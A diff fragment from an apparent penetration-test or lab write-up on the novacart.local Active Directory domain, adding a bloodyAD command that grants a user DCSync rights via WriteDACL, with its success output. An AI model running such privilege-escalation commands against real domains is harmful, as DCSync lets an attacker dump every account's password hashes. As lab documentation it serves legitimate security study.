@@ -1506,6 +1506,12 @@ Looking at bloodhound this user has WriteDACL on the novacart.local GPO
 This means i should be able to apply DCSync privs
 
 ```python
+bloodyAD -u 'm.ibabao' -d 'novacart.local' --host DC.novacart.local --dc-ip 10.0.18.23 --kerberos add dcsync 'm.ibabao'
+[+] m.ibabao is now able to DCSync
+```
+Now i can do a DCSync
+
+```python
 
 ```
 
